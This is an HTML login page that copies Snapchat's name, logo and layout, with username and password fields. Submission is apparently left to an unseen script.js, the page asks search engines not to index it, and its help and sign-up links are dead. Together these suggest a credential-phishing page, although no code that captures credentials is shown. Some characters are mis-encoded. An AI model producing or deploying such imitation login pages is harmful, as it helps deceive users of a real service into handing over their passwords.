<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <link rel="icon" type="image/png" href="Snapchat.png">
    <link rel="stylesheet" href="Snapchat.css">
    <meta name="description" content="Log in to Snapchat">
    <meta name="robots" content="noindex, nofollow">
</head>
<body>
    <div class="container login-container">
        <div class="language-container">
            <button class="language-btn" onclick="toggleLanguageMenu()" aria-label="Change language">üåê</button>
            <div class="language-menu" id="language-menu">
                <a href="#" onclick="setLanguage('en'); return false;">English</a>
                <a href="#" onclick="setLanguage('fr'); return false;">Fran√ßais</a>
            </div>
        </div>
        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
        <h1 id="title">Log in to Snapchat</h1>
        <form id="loginForm" autocomplete="off">
            <input type="text" name="username" class="login-input" placeholder="Username or email" id="username-placeholder" required autocomplete="username">
            <div class="password-container">
                <input type="password" name="password" class="login-input" placeholder="Password" id="password-placeholder" required autocomplete="current-password">
                <span class="toggle-password" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
                    <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999999" stroke-width="2">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </span>
            </div>
            <button type="submit" class="login-btn" id="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-link" id="forgot-link" onclick="return false;">Forgot your password?</a>
        <p class="support-text" id="support-text">New to Snapchat? <a href="#" onclick="return false;">Sign Up</a></p>
    </div>
    <script src="script.js"></script>
</body>
</html>
